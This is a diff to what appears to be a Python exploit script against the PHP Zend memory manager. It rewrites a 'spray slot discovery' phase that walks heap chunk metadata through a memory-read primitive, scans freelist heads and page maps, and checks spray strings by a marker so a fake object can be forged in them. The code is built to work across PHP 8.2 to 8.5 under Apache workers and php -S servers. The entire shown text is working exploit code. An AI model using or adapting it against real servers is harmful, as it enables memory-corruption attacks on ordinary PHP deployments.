@@ -20,6 +20,7 @@ crash_count = 0
 ADDR_MAX = 0x0000FFFFFFFFFFFF
 SPRAY_LEN = 280
 SPRAY_COUNT = 32
+SPRAY_MARKER = b'\x00\x00\xbb\xbb'  # spray template bytes 8..12 (0xBBBB0000 LE)
 
 
 def gnu_hash_func(name):
@@ -700,55 +701,95 @@ def lookup_class_table(eg, name):
 
 
 def find_spray_slot(heap_ref):
-    """R-6: walk ZendMM chunk metadata to identify the bin-320 SRUN page
-    holding the freed allocation, probe its slots for our spray strings,
-    and return the absolute address `S` (the data pointer of the spray
-    string we'll forge an object inside).
+    """R-6: locate a live spray slot and return S = slot+0x18 (the spray
+    string's data pointer, where we forge the object).
+
+    Primary (layout-agnostic; proven on the php 8.2 lane): the heap struct
+    is embedded at chunk+0x40 of the leaked arData chunk (confirmed the
+    main chunk on apache-worker AND long-lived php -S heaps: its
+    main_chunk field points back at the chunk itself). The bin-320
+    freelist head (free_slot[16]) is a 320-grid pointer; the live spray
+    #1 sits one slot (0x140) below the echoed head because each request
+    pops arData8 + spray#1 from the list before the echo. Candidates are
+    verified by len==SPRAY_LEN AND the 0xBBBB0000 marker at data[8:12].
+    Fast path; fails when free_slot[16] is NULL at echo time (long-lived
+    php -S heaps drain the freelist each request).
+
+    Fallback (map-signature walk): the chunk page map's page-0 entry is
+    always 0x40000001 (the metadata page's own 1-page LRUN), so the map
+    is found by signature instead of version-guessed: php 8.2 data
+    0x1C0, 8.4 0x218, 8.5 0x1F8 all fall out dynamically. Bin-320 SRUN
+    pages are decoded (multi-page runs carry 0xC... continuation pages)
+    and their slots probed for a verified spray string.
     """
     print(f"\n[Phase R-6] Spray slot discovery")
-    chunk_base = heap_ref & ~0x1FFFFF
-    print(f"  chunk_base = 0x{chunk_base:x}")
+    chunk0 = heap_ref & ~0x1FFFFF
+    print(f"  chunk_base = 0x{chunk0:x}")
 
-    # Read chunk metadata header.
-    r = isstring_read(chunk_base + 0x40)
+    def verify(addr):
+        v = isstring_read(addr)
+        if v is None:
+            return None
+        vlen, vdata = v
+        if vlen == SPRAY_LEN and vdata[8:12] == SPRAY_MARKER:
+            return addr + 0x18
+        return None
+
+    # Read the heap struct window embedded at chunk+0x40.
+    r = isstring_read(chunk0 + 0x40)
     if r is None:
         return None
     _heap_size, cdata = r
-
-    # Page map at chunk+0x250; data starts at chunk+0x58, so map offset is 0x1F8.
-    MAP_OFF = 0x1F8
-    if len(cdata) < MAP_OFF + 512 * 4:
+    if len(cdata) < 200:
         return None
 
+    # --- Primary: bin-320 freelist head scan (no layout constants) ---
+    free_cands = []
+    for off in range(8, min(len(cdata), 0x1B8) - 7, 8):
+        p = struct.unpack_from('<Q', cdata, off)[0]
+        if chunk0 < p < chunk0 + 0x200000 and p % 320 == 0:
+            free_cands.append(p)
+    for free16 in free_cands:
+        for cand in (free16 - 0x140, free16, free16 - 0x280,
+                     free16 + 0x140, free16 + 0x280):
+            if cand <= 0x10000 or cand > ADDR_MAX:
+                continue
+            S = verify(cand)
+            if S is not None:
+                print(f"  free_slot head 0x{free16:x} -> spray @ 0x{cand:x}")
+                print(f"  S = 0x{S:x}")
+                return S
+
+    # --- Fallback: signature-detected page map ---
+    MAP_OFF = None
+    for cand in range(0x100, 0x300, 4):
+        if cand + 4 <= len(cdata) and \
+                struct.unpack_from('<I', cdata, cand)[0] == 0x40000001:
+            MAP_OFF = cand
+            break
+    if MAP_OFF is None or len(cdata) < MAP_OFF + 512 * 4:
+        return None
+    print(f"  page map at data 0x{MAP_OFF:x} (chunk+0x{MAP_OFF + 0x58:x})")
     runs = []
     for pn in range(1, 512):
         info = struct.unpack_from('<I', cdata, MAP_OFF + pn * 4)[0]
         is_srun = (info & 0x80000000) != 0
-        is_lrun = (info & 0x40000000) != 0
-        if is_srun and not is_lrun and (info & 0x1F) == 16:
+        is_cont = (info & 0x40000000) != 0
+        if is_srun and not is_cont and (info & 0x1F) == 16:
             free_count = (info >> 16) & 0x1FF
             print(f"  Bin-320 SRUN at page {pn}, free_count={free_count}")
             runs.append(pn)
             if len(runs) >= 4:
                 break
-
-    if not runs:
-        return None
-
     for pn in runs:
-        run_start = chunk_base + pn * 0x1000
+        run_start = chunk0 + pn * 0x1000
         print(f"  Run start = 0x{run_start:x} (page {pn})")
-
-        # Probe each 320-byte slot looking for our 280-byte spray string.
-        # 204 slots = one 64K page worth at 320B spacing.
+        # Probe each 320-byte slot for our spray string; 204 slots covers
+        # the full 5-page bin-320 run (plus slack) regardless of grid.
         for slot in range(204):
             addr = run_start + slot * 320
-            r2 = isstring_read(addr)
-            if r2 is None:
-                continue
-            slen, _ = r2
-            if slen == SPRAY_LEN:
-                S = addr + 0x18
+            S = verify(addr)
+            if S is not None:
                 print(f"  Found spray at slot {slot} @ 0x{addr:x}")
                 print(f"  S = 0x{S:x}")
                 return S
